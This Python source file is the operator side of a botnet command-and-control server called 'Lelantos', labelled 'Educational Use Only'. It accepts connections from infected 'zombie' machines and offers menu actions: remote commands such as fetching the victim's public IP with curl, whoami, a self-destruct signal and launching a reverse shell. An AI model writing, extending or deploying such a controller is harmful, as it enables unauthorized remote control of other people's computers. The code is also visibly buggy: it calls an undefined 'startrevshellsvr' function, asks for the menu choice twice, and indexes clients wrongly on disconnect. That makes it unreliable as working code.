import socket # Socket needed for networking in python
import subprocess # System commands needed for python
import sys # Python runtime
import time # Timers etc
import threading # Runs multiple tasks
import asyncio # Many network tasks
import io # Memory text streams
import os # Interacts with OS
import psutil # System utility information
import colorama # Coloured terminal output
from colorama import Fore, Back, Style, init
import pyfiglet
exit_event = threading.Event()

init(autoreset=True)
counter=-1
clientlist=[]
clientdata=[]
automigrate=""
host = "0.0.0.0"
port = 4545

DEEP_RED = "\033[38;5;88m"
SHADOW_RED = "\033[38;5;52m"
TEXT_RED = "\033[38;5;160m"


# Function to print banner in terminal when programme runs

def print_banner():
    banner = pyfiglet.figlet_format("Lelantos", font="ansi_shadow")
    print()
    for line in banner.splitlines():
        print(DEEP_RED + line + Style.RESET_ALL)
    print(TEXT_RED + "    Educational Use Only\n" + Style.RESET_ALL)

print_banner()

# Socket set ups for host and port as well as IPV4 and TCP.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # This defines an IPV4 and TCP Socket/Endpoint
s.bind((host, port)) # This binds the socket to host and port 
s.listen(5) # Sets socket to listen. 5 connections can wait in queue before being accepted
print(Fore.GREEN + "[+] Listening on " + host + ":" + str(port) + Style.RESET_ALL) # Prints a line saying port and ip address the server is listening on

# Function used to handle multiple connections as well as the selection of a specific agent.

def server_selection():
    global clientlist
    commands = "True"

    while not "exit" in commands:
        command=input(Fore.GREEN + "Input:" + Fore.WHITE)
        if command=="":
            continue
        elif command=="zombies": # Interact with an agent
            zombies()
        elif command == "cls" or command == "clear": # Clears the terminal
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
        elif command == "?" or command == "help": # Help Menu
            print(Fore.RED + "commands:\n$ zombies\n$ clear/cls (clears screen)\n$ control + C kills server\n" + Fore.WHITE)

def startrevshells():
    if os.name == 'nt':
        subprocess.call(["py", "server.py"])
        exit_event.set()
    else:
        subprocess.call(["python3", "server.py"])
        exit_event.set()

## init_main_sock() is the main function

def init_main_sock():
    while True:
        conn, addr = s.accept() # Accepts a connection from a client 
        print(Fore.GREEN + f'\n[+] New Connection From: {addr[0]}:{addr[1]}' + Fore.WHITE) # Prints the IP and port 

        global counter 
        global automigrate
        counter += 1 # Increments the counter by 1
        
        # Gathers client info
        clientinfo = conn.recv(1024)
        clientinfo = clientinfo.decode('utf-8')
        clientinfo = clientinfo.split("\n")

        # Get first item from client info (e.g. UserInfo = "John Doe's PC")
        UserInfo=clientinfo[0]
        # Print recieved client info (this is just for testing purposes, can be removed later)
        print(clientinfo)
        # Stores sumary in clientlist and adds a new item to clientlist. It stores counter, conn and userInfo
        clientlist.append([counter, conn, UserInfo])
        clientdata.append([clientinfo])

        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()

# Probe function. Determines if client is still alive.
def probe():
    while True:
        global counter
        global clientlist
        global clientdata

        try:
            d = 0
            for c in range(len(clientlist)):
                clientlist[c][1].send(b"?keep Alive?")
                d = d + 1
        except:
            print(
                Fore.RED + "\n [-] Client Disconnected \n************************\n" + Fore.WHITE,
                counter,
                "--> ",
                clientdata[d],
                "\n************************\n"
            )
            clientlist.pop(d)
            clientdata.pop(d)
            counter = counter - 1
            print(Fore.RED + "[+] Removed agent" + Fore.WHITE)
        time.sleep(5) # Waits 5 seconds before sending the next keep alive message

def zombies():
    global counter
    global clientlist
    global clientdata
    selection = ""

    if (len(clientlist) <= 0):
        print(Fore.RED + "[-] No agents connected" + Fore.WHITE)
        return
    
    print (Fore.RED + "Connected Agents:\n" + Fore.WHITE)

    temp = 0
    for b in clientdata:
        print("Zombie: ", temp, "-->", b)
        temp += 1
    print(Fore.RED + "\nPick a zombie to connect too\n" + Fore.WHITE)
    
    try:
        selection = int(input( ' Enter the client: '))
    except:
        print(Fore.RED + "[!] Enter client Number" + Fore.WHITE)
        time.sleep(4)
        return

    while True:
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")

        print(Fore.GREEN)
        print("what would you like to do?")
        print("1. Send a Message")
        print("2. Get user info")
        print("3. Get public ip")
        print("4. Kill Zombie")
        print("5. Start a Shell!")
        print("6. Whoami")

        choice = input(Fore.YELLOW + "[Select a number]: $ " + Fore.WHITE)
            
        try:
            choice=input(Fore.YELLOW + "[Select a number]: $ " + Fore.WHITE)
        except:    
            print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
            time.sleep(2)
            return            
        if choice == "1":
            try:
                clientlist[selection][1].send(b":msg:\nhey from the server!\n")
                print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "2":
            for a in clientdata[selection]:
                print(a)
            input()
        if choice == "3":
            try:
                clientlist[selection][1].send(b"c0mm@nd\ncurl ifconfig.me\n")
                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
                pubip=clientlist[selection][1].recv(1024)
                pubip = pubip.decode('UTF-8')
                print(pubip)
                input("press any key...")
            except:
                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "4":
            try:
                clientlist[selection][1].send(b"self-destruct\n")
                print(Fore.GREEN + "[+] zombie self-destruct succeeded!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "5":
            #starttheshell(clientlist[selection][1])
            #subprocess.call(["python", "testsocketserver.py"])
            exit_event.clear()
            
            handler_thread = threading.Thread(target=startrevshellsvr)
            handler_thread.daemon = True
            handler_thread.start()
            
            print("[+] starting shell in 2 seconds!")
            time.sleep(2)
            
            clientlist[selection][1].send(b":shell:\n")
            
            #handler_thread2 = threading.Thread(target=startrevshellcli)
            #handler_thread2.daemon = True
            #handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
            return
        if choice == "6":
            clientlist[selection][1].send(b":whoami:\n")
            whoami=clientlist[selection][1].recv(1024)
            whoami = whoami.decode('UTF-8')
            print("You are: ", whoami)
            time.sleep(2)

    

# This block of code starts the threads to keep the main programme alive 

# threading.Thread(...) Creates a new thread
# target=init_main_sock tells the thread which function to run
# daemon = True makes the programme run as background thread 
# start() Actually begins the thread 

# The line below also calls a variable (handler_thread) which is equal too threading.Thread(...) so that the thread can be referenced
handler_thread = threading.Thread(target=init_main_sock) # creates and starts thread to run the init_main_sock function
handler_thread.daemon = True
handler_thread.start()

# Run the interactive menu on the main thread so it can read keyboard input
server_selection()

